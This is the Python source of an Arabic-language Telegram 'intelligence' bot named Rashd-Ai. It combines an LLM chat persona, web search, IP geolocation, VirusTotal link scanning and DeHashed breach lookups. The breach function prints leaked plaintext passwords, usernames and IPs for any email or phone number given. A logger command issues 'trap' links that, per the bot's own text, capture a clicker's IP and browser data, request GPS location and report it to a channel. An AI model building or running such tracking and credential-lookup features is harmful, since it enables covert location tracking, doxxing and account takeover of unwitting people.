import os
import re
import base64
import asyncio
import hashlib
import time
import requests
import json
from io import BytesIO
from datetime import datetime

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  إعدادات النظام | System Configuration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MAIN_BOT_TOKEN     = os.getenv("MAIN_BOT_TOKEN", "")
TRACKER_BOT_TOKEN  = os.getenv("TRACKER_BOT_TOKEN", "")
GROQ_API_KEY       = os.getenv("GROQ_API_KEY", "")
TAVILY_API_KEY     = os.getenv("TAVILY_API_KEY", "")
IPINFO_TOKEN       = os.getenv("IPINFO_TOKEN", "")
VIRUSTOTAL_KEY     = os.getenv("VIRUSTOTAL_KEY", "")
DEHASHED_KEY       = os.getenv("DEHASHED_KEY", "")
TARGET_CHANNEL_ID  = os.getenv("TARGET_CHANNEL_ID", "")

# عنوان الخادم العام لروابط التعقب
BOT_SERVER_URL = (
    os.getenv("BOT_SERVER_URL", "")
    or (os.getenv("REPLIT_DOMAINS", "").split(",")[0].strip() if os.getenv("REPLIT_DOMAINS") else "")
)

SYSTEM_PROMPT = """أنت نظام ذكاء اصطناعي متقدم من تصميم وتطوير أبو سعود، يُعرف بـ "راشد الاستخباراتي".
ردودك دائماً باللغة العربية الفصحى، بأسلوب استخباراتي رسمي ومقتضب كتقارير الأجهزة الأمنية.
لا تتحدث عن نفسك بصيغة الأنثى. استخدم صيغة المذكر دائماً.
ابدأ كل رد بـ: [راشد // تحليل]
اختم كل رد بـ: ◈ تصميم وتطوير: أبو سعود"""

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🧠  وحدة الذكاء الاصطناعي | AI Module (Groq)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ask_groq(prompt: str, model: str = "llama3-70b-8192") -> str:
    if not GROQ_API_KEY:
        return "⛔ خطأ: مفتاح Groq غير مُهيّأ."
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {GROQ_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ],
        "temperature": 0.5,
        "max_tokens": 1024,
    }
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=30)
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except requests.exceptions.Timeout:
        return "⚠️ [راشد // خطأ]\nانتهت مهلة الاتصال بمحرك الذكاء الاصطناعي."
    except Exception as e:
        return f"⚠️ [راشد // خطأ]\nفشل الاتصال: {str(e)[:80]}"


def analyze_image_groq(image_bytes: bytes, prompt: str = "حلل هذه الصورة بالتفصيل، صف محتواها واستخرج أي نصوص.") -> str:
    if not GROQ_API_KEY:
        return "⛔ خطأ: مفتاح Groq غير مُهيّأ."
    b64_img = base64.b64encode(image_bytes).decode("utf-8")
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {GROQ_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "llava-v1.5-7b-4096-preview",
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": f"{SYSTEM_PROMPT}\n\nمهمة: {prompt}"},
                    {
                        "type": "image_url",
                        "image_url": {
                            "url": f"data:image/jpeg;base64,{b64_img}"
                        },
                    },
                ],
            }
        ],
        "temperature": 0.4,
        "max_tokens": 1024,
    }
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=45)
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"]
    except Exception as e:
        return f"⚠️ [راشد // خطأ رؤية حاسوبية]\n{str(e)[:100]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔍  وحدة البحث الذكي | Live Search (Tavily)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def live_search(query: str) -> str:
    if not TAVILY_API_KEY:
        return "⛔ مفتاح Tavily غير مُهيّأ."
    url = "https://api.tavily.com/search"
    payload = {
        "api_key": TAVILY_API_KEY,
        "query": query,
        "search_depth": "advanced",
        "max_results": 5,
        "include_answer": True,
    }
    try:
        r = requests.post(url, json=payload, timeout=20)
        r.raise_for_status()
        data = r.json()
        answer = data.get("answer", "")
        results = data.get("results", [])

        report = "━━━━━━━━━━━━━━━━━━━━━\n"
        report += "📡 [راشد // تقرير بحثي]\n"
        report += f"🔎 استعلام: {query}\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n\n"

        if answer:
            report += f"📌 ملخص تحليلي:\n{answer}\n\n"

        report += "📂 المصادر المرصودة:\n"
        for i, res in enumerate(results[:4], 1):
            title = res.get("title", "بلا عنوان")
            link = res.get("url", "#")
            snippet = res.get("content", "")[:120]
            report += f"\n{i}▪ {title}\n   🔗 {link}\n   ↳ {snippet}...\n"

        report += "\n━━━━━━━━━━━━━━━━━━━━━"
        report += "\n◈ تصميم وتطوير: أبو سعود"
        return report
    except requests.exceptions.Timeout:
        return "⚠️ [راشد // خطأ]\nانتهت مهلة بحث Tavily."
    except Exception as e:
        return f"⚠️ [راشد // خطأ]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🌍  وحدة تحليل IP | IP Intelligence (IPInfo)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def analyze_ip(ip: str) -> str:
    if not IPINFO_TOKEN:
        return "⛔ مفتاح IPInfo غير مُهيّأ."
    try:
        r = requests.get(
            f"https://ipinfo.io/{ip}/json",
            headers={"Authorization": f"Bearer {IPINFO_TOKEN}"},
            timeout=15,
        )
        r.raise_for_status()
        d = r.json()

        if "error" in d:
            return f"⛔ IP غير صالح أو غير موجود: {ip}"

        loc = d.get("loc", "N/A").split(",")
        lat = loc[0] if len(loc) == 2 else "N/A"
        lon = loc[1] if len(loc) == 2 else "N/A"
        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"

        report  = "━━━━━━━━━━━━━━━━━━━━━\n"
        report += "🌐 [راشد // تقرير IP]\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n"
        report += f"🎯 العنوان    : {d.get('ip', ip)}\n"
        report += f"🏳 الدولة    : {d.get('country', 'N/A')}\n"
        report += f"🏙 المدينة   : {d.get('city', 'N/A')}\n"
        report += f"📍 المنطقة   : {d.get('region', 'N/A')}\n"
        report += f"🏢 المزود    : {d.get('org', 'N/A')}\n"
        report += f"📮 الرمز     : {d.get('postal', 'N/A')}\n"
        report += f"🕐 المنطقة الزمنية: {d.get('timezone', 'N/A')}\n"
        report += f"🗺 الإحداثيات: {lat}, {lon}\n"
        report += f"📌 الخريطة  : {maps_link}\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n"
        report += "◈ تصميم وتطوير: أبو سعود"
        return report
    except requests.exceptions.Timeout:
        return "⚠️ انتهت مهلة الاتصال بخدمة IPInfo."
    except Exception as e:
        return f"⚠️ [راشد // خطأ IP]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🛡  وحدة فحص الروابط | Link Scanner (VirusTotal)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def scan_url(url_to_scan: str) -> str:
    if not VIRUSTOTAL_KEY:
        return "⛔ مفتاح VirusTotal غير مُهيّأ."
    headers = {
        "x-apikey": VIRUSTOTAL_KEY,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        # Submit URL
        submit = requests.post(
            "https://www.virustotal.com/api/v3/urls",
            headers=headers,
            data={"url": url_to_scan},
            timeout=20,
        )
        submit.raise_for_status()
        analysis_id = submit.json()["data"]["id"]

        # Poll for results (max 30 seconds)
        for _ in range(6):
            time.sleep(5)
            result = requests.get(
                f"https://www.virustotal.com/api/v3/analyses/{analysis_id}",
                headers={"x-apikey": VIRUSTOTAL_KEY},
                timeout=15,
            )
            result.raise_for_status()
            data = result.json()
            status = data["data"]["attributes"].get("status", "queued")
            if status == "completed":
                stats = data["data"]["attributes"]["stats"]
                malicious = stats.get("malicious", 0)
                suspicious = stats.get("suspicious", 0)
                harmless = stats.get("harmless", 0)
                undetected = stats.get("undetected", 0)
                total = malicious + suspicious + harmless + undetected

                verdict = "🔴 خطر // مشبوه" if malicious > 0 else ("🟡 مريب" if suspicious > 0 else "🟢 آمن")

                report  = "━━━━━━━━━━━━━━━━━━━━━\n"
                report += "🛡 [راشد // تقرير أمني]\n"
                report += "━━━━━━━━━━━━━━━━━━━━━\n"
                report += f"🔗 الرابط    : {url_to_scan[:60]}...\n" if len(url_to_scan) > 60 else f"🔗 الرابط    : {url_to_scan}\n"
                report += f"⚖️ الحكم     : {verdict}\n"
                report += f"🔴 خطر       : {malicious}/{total} محرك\n"
                report += f"🟡 مريب      : {suspicious}/{total} محرك\n"
                report += f"🟢 نظيف      : {harmless}/{total} محرك\n"
                report += "━━━━━━━━━━━━━━━━━━━━━\n"
                report += "◈ تصميم وتطوير: أبو سعود"
                return report

        return "⚠️ لم يكتمل الفحص في الوقت المحدد. أعد المحاولة."
    except Exception as e:
        return f"⚠️ [راشد // خطأ فحص]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔓  وحدة فحص التسريبات | Breach Check (DeHashed)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_breach(target: str) -> str:
    if not DEHASHED_KEY:
        return "⛔ مفتاح DeHashed غير مُهيّأ."

    is_email = "@" in target
    query_type = "email" if is_email else "phone"

    headers = {
        "Authorization": f"Basic {DEHASHED_KEY}",
        "Content-Type": "application/json",
    }
    params = {
        "query": f'{query_type}:"{target}"',
        "size": 10,
    }
    try:
        r = requests.get(
            "https://api.dehashed.com/search",
            headers=headers,
            params=params,
            timeout=20,
        )
        r.raise_for_status()
        data = r.json()
        total = data.get("total", 0)
        entries = data.get("entries", [])

        if total == 0:
            report  = "━━━━━━━━━━━━━━━━━━━━━\n"
            report += "🔓 [راشد // تقرير تسريب]\n"
            report += "━━━━━━━━━━━━━━━━━━━━━\n"
            report += f"🎯 الهدف     : {target}\n"
            report += "✅ النتيجة   : لا توجد سجلات في قواعد التسريبات.\n"
            report += "━━━━━━━━━━━━━━━━━━━━━\n"
            report += "◈ تصميم وتطوير: أبو سعود"
            return report

        report  = "━━━━━━━━━━━━━━━━━━━━━\n"
        report += "🔓 [راشد // تقرير تسريب]\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n"
        report += f"🎯 الهدف       : {target}\n"
        report += f"⚠️ عدد الاختراقات: {total} سجل\n"
        report += "━━━━━━━━━━━━━━━━━━━━━\n"

        for i, entry in enumerate(entries[:5], 1):
            report += f"\n[سجل #{i}]\n"
            if entry.get("email"):
                report += f"  📧 إيميل  : {entry['email']}\n"
            if entry.get("username"):
                report += f"  👤 مستخدم : {entry['username']}\n"
            if entry.get("password"):
                report += f"  🔑 كلمة مرور: {entry['password']}\n"
            if entry.get("hashed_password"):
                report += f"  🔒 هاش    : {entry['hashed_password'][:40]}...\n"
            if entry.get("database_name"):
                report += f"  🗂 قاعدة   : {entry['database_name']}\n"
            if entry.get("ip_address"):
                report += f"  🌐 IP      : {entry['ip_address']}\n"

        if total > 5:
            report += f"\n... و{total - 5} سجل إضافي.\n"

        report += "━━━━━━━━━━━━━━━━━━━━━\n"
        report += "◈ تصميم وتطوير: أبو سعود"
        return report
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 401:
            return "⛔ مفتاح DeHashed غير صالح أو منتهي الصلاحية."
        return f"⚠️ [راشد // خطأ DeHashed]\n{str(e)[:80]}"
    except Exception as e:
        return f"⚠️ [راشد // خطأ]\n{str(e)[:80]}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📡  وحدة توليد روابط التعقب | IP/GPS Logger Link Generator
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_logger_link(context_label: str = "system-check") -> dict:
    """توليد رابط فخ لتعقب IP وGPS الزائر"""
    if not BOT_SERVER_URL:
        return {"error": "لا يمكن توليد الرابط: عنوان الخادم غير متاح."}

    # توليد معرّف فريد للجلسة
    session_id = hashlib.md5(f"{context_label}{time.time()}".encode()).hexdigest()[:12]
    tracker_url = f"https://{BOT_SERVER_URL}/track/{session_id}"

    return {
        "url": tracker_url,
        "session_id": session_id,
        "label": context_label,
        "created_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🤖  الكشف الذكي التلقائي | Smart Auto-Detection
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

URL_PATTERN = re.compile(
    r"https?://[^\s]+"
    r"|www\.[^\s]+"
    r"|[a-zA-Z0-9.-]+\.(com|net|org|io|co|info|biz|xyz|gov|edu)[^\s]*",
    re.IGNORECASE,
)
IP_PATTERN = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
EMAIL_PATTERN = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
PHONE_PATTERN = re.compile(r"\b(?:\+?\d[\d\s\-]{8,14}\d)\b")


def smart_detect(text: str) -> str:
    """كشف ذكي: هل الرسالة تحتوي URL أو IP أو إيميل؟"""
    if URL_PATTERN.search(text):
        return "url"
    if IP_PATTERN.search(text):
        return "ip"
    if EMAIL_PATTERN.search(text):
        return "email"
    if PHONE_PATTERN.search(text):
        return "phone"
    return "ai"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎛  لوحة تحكم القوائم | Keyboard Menus
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main_keyboard() -> InlineKeyboardMarkup:
    kb = [
        [
            InlineKeyboardButton("🌐 تحليل IP",        callback_data="menu_ip"),
            InlineKeyboardButton("🛡 فحص رابط",         callback_data="menu_scan"),
        ],
        [
            InlineKeyboardButton("🔓 فحص تسريب",       callback_data="menu_breach"),
            InlineKeyboardButton("🔍 بحث مباشر",        callback_data="menu_search"),
        ],
        [
            InlineKeyboardButton("📡 رابط تعقب",        callback_data="menu_logger"),
            InlineKeyboardButton("🧠 تحليل صورة",       callback_data="menu_vision"),
        ],
        [
            InlineKeyboardButton("ℹ️ عن النظام",         callback_data="menu_about"),
            InlineKeyboardButton("📋 الأوامر",           callback_data="menu_help"),
        ],
    ]
    return InlineKeyboardMarkup(kb)


def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("↩️ القائمة الرئيسية", callback_data="menu_main")]])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📨  معالجات الأوامر | Command Handlers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name or "العميل"
    text = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ [راشد // تهيئة النظام]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"مرحباً، {name}.\n"
        "النظام الاستخباراتي راشد جاهز للعمل.\n\n"
        "🧭 اختر الأداة المناسبة من القائمة أدناه:\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    )
    await update.message.reply_text(text, reply_markup=main_keyboard())


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📋 [راشد // دليل الأوامر]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "• /ip <عنوان IP> — تحليل جغرافي وبنيوي\n"
        "• /scan <رابط> — فحص أمني عبر VirusTotal\n"
        "• /breach <إيميل|هاتف> — فحص قواعد التسريبات\n"
        "• /search <استعلام> — بحث فوري بالإنترنت\n"
        "• /logger — توليد رابط تعقب IP/GPS\n"
        "• /start — القائمة الرئيسية\n\n"
        "🔄 أرسل أي نص وسأحدد الأداة تلقائياً.\n"
        "🖼 أرسل صورة لتحليلها بالرؤية الحاسوبية.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    )
    await update.message.reply_text(text, reply_markup=back_keyboard())


async def cmd_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ الاستخدام: /ip <عنوان IP>\nمثال: /ip 8.8.8.8",
            reply_markup=back_keyboard(),
        )
        return
    ip = args[0].strip()
    msg = await update.message.reply_text(f"⏳ جارٍ تحليل العنوان: {ip}...")
    result = analyze_ip(ip)
    await msg.edit_text(result, reply_markup=back_keyboard())


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ الاستخدام: /scan <رابط>\nمثال: /scan https://example.com",
            reply_markup=back_keyboard(),
        )
        return
    url = args[0].strip()
    msg = await update.message.reply_text(f"⏳ جارٍ فحص الرابط عبر 70+ محرك أمني...")
    result = scan_url(url)
    await msg.edit_text(result, reply_markup=back_keyboard())


async def cmd_breach(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ الاستخدام: /breach <إيميل أو رقم هاتف>\nمثال: /breach test@email.com",
            reply_markup=back_keyboard(),
        )
        return
    target = " ".join(args).strip()
    msg = await update.message.reply_text(f"⏳ جارٍ مسح قواعد التسريبات العالمية...")
    result = check_breach(target)
    await msg.edit_text(result, reply_markup=back_keyboard())


async def cmd_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ الاستخدام: /search <استعلام>\nمثال: /search أحدث هجمات سيبرانية 2025",
            reply_markup=back_keyboard(),
        )
        return
    query = " ".join(args)
    msg = await update.message.reply_text("⏳ جارٍ البحث في المصادر الحية...")
    result = live_search(query)
    await msg.edit_text(result, reply_markup=back_keyboard())


async def cmd_logger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    label = " ".join(context.args) if context.args else "intelligence-op"
    link_data = generate_logger_link(label)

    if "error" in link_data:
        await update.message.reply_text(
            f"⛔ {link_data['error']}\n\nتأكد من أن الخادم يعمل بعنوان عام.",
            reply_markup=back_keyboard(),
        )
        return

    text = (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 [راشد // رابط تعقب]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 الرابط    :\n{link_data['url']}\n\n"
        f"🆔 معرّف الجلسة: `{link_data['session_id']}`\n"
        f"🏷 التصنيف  : {link_data['label']}\n"
        f"🕐 وقت التوليد: {link_data['created_at']}\n\n"
        "⚡ عند الضغط على الرابط:\n"
        "  ↳ يُسحب IP + بيانات المتصفح\n"
        "  ↳ يُطلب إذن الموقع الجغرافي\n"
        "  ↳ يُرسل تقرير فوري للقناة المستهدفة\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    )
    await update.message.reply_text(text, reply_markup=back_keyboard(), parse_mode="Markdown")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🖼  معالج الصور | Image Handler (Vision)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("⏳ جارٍ تحليل الصورة بالرؤية الحاسوبية...")
    photo = update.message.photo[-1]
    caption = update.message.caption or "حلل الصورة بالكامل، صف محتواها، واستخرج أي نصوص أو وجوه أو أشياء."

    try:
        file = await context.bot.get_file(photo.file_id)
        image_bytes = await file.download_as_bytearray()
        result = analyze_image_groq(bytes(image_bytes), caption)
        await msg.edit_text(result, reply_markup=back_keyboard())
    except Exception as e:
        await msg.edit_text(
            f"⚠️ [راشد // خطأ تحليل صورة]\n{str(e)[:100]}",
            reply_markup=back_keyboard(),
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  💬  معالج النصوص الذكي | Smart Text Handler
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    detection = smart_detect(text)

    if detection == "url":
        url_match = URL_PATTERN.search(text)
        if url_match:
            url = url_match.group(0)
            if not url.startswith("http"):
                url = "http://" + url
            msg = await update.message.reply_text(
                f"🔎 رصد رابط — جارٍ الفحص الأمني التلقائي...\n🔗 {url}"
            )
            result = scan_url(url)
            await msg.edit_text(result, reply_markup=back_keyboard())
            return

    if detection == "ip":
        ip_match = IP_PATTERN.search(text)
        if ip_match:
            ip = ip_match.group(0)
            msg = await update.message.reply_text(f"🌐 رصد IP — جارٍ التحليل التلقائي...\n📍 {ip}")
            result = analyze_ip(ip)
            await msg.edit_text(result, reply_markup=back_keyboard())
            return

    if detection == "email":
        email_match = EMAIL_PATTERN.search(text)
        if email_match:
            email = email_match.group(0)
            msg = await update.message.reply_text(f"📧 رصد إيميل — جارٍ فحص التسريبات...\n{email}")
            result = check_breach(email)
            await msg.edit_text(result, reply_markup=back_keyboard())
            return

    # Default: AI response
    msg = await update.message.reply_text("⏳ جارٍ المعالجة...")
    result = ask_groq(text)
    await msg.edit_text(result, reply_markup=back_keyboard())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎛  معالج القوائم | Callback Query Handler
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MENU_TEXTS = {
    "menu_ip": (
        "🌐 [راشد // تحليل IP]\n\n"
        "أرسل الأمر:\n`/ip <عنوان IP>`\n\nمثال:\n`/ip 1.1.1.1`"
    ),
    "menu_scan": (
        "🛡 [راشد // فحص رابط]\n\n"
        "أرسل الأمر:\n`/scan <الرابط>`\n\nأو أرسل الرابط مباشرة وسأكتشفه تلقائياً."
    ),
    "menu_breach": (
        "🔓 [راشد // فحص تسريبات]\n\n"
        "أرسل الأمر:\n`/breach <إيميل أو هاتف>`\n\nمثال:\n`/breach user@email.com`"
    ),
    "menu_search": (
        "🔍 [راشد // بحث مباشر]\n\n"
        "أرسل الأمر:\n`/search <الاستعلام>`\n\nمثال:\n`/search هجمات سيبرانية 2025`"
    ),
    "menu_logger": (
        "📡 [راشد // رابط تعقب]\n\n"
        "أرسل الأمر:\n`/logger <تصنيف اختياري>`\n\nمثال:\n`/logger op-falcon`"
    ),
    "menu_vision": (
        "🧠 [راشد // تحليل صورة]\n\n"
        "أرسل صورة مباشرة، مع أو بدون وصف.\n"
        "سأقوم بتحليلها وصف محتواها واستخراج النصوص."
    ),
    "menu_about": (
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ [راشد // معلومات النظام]\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "الاسم   : راشد الاستخباراتي (Rashd-Ai)\n"
        "الإصدار : v2.0 Professional\n"
        "المطور  : أبو سعود\n\n"
        "🔧 الأنظمة المدمجة:\n"
        "  • Groq AI (LLaMA 3 + Vision)\n"
        "  • Tavily Live Search\n"
        "  • VirusTotal (70+ محرك)\n"
        "  • DeHashed Breach DB\n"
        "  • IPInfo Intelligence\n"
        "  • IP/GPS Logger\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "◈ تصميم وتطوير: أبو سعود"
    ),
    "menu_help": (
        "📋 [راشد // دليل الأوامر]\n\n"
        "• /ip <IP> — تحليل جغرافي\n"
        "• /scan <URL> — فحص أمني\n"
        "• /breach <إيميل|هاتف> — تسريبات\n"
        "• /search <استعلام> — بحث حي\n"
        "• /logger — رابط تعقب\n"
        "• /start — القائمة الرئيسية\n\n"
        "أو أرسل أي نص وسأحدد الأداة تلقائياً.\n"
        "◈ تصميم وتطوير: أبو سعود"
    ),
}


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "menu_main":
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ [راشد // القائمة الرئيسية]\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "اختر الأداة المطلوبة:\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "◈ تصميم وتطوير: أبو سعود",
            reply_markup=main_keyboard(),
        )
        return

    if data in MENU_TEXTS:
        kb = back_keyboard()
        await query.edit_message_text(
            MENU_TEXTS[data],
            reply_markup=kb,
            parse_mode="Markdown",
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت | Bot Startup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    if not MAIN_BOT_TOKEN:
        raise RuntimeError("MAIN_BOT_TOKEN غير موجود في المتغيرات البيئية!")

    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    # أوامر
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(CommandHandler("ip",     cmd_ip))
    app.add_handler(CommandHandler("scan",   cmd_scan))
    app.add_handler(CommandHandler("breach", cmd_breach))
    app.add_handler(CommandHandler("search", cmd_search))
    app.add_handler(CommandHandler("logger", cmd_logger))

    # صور
    app.add_handler(MessageHandler(filters.PHOTO, handle_image))

    # نصوص (الكشف الذكي التلقائي)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # أزرار القائمة
    app.add_handler(CallbackQueryHandler(handle_callback))

    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⚡ راشد الاستخباراتي — تشغيل النظام")
    print("🤖 البوت الرئيسي: جاهز")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
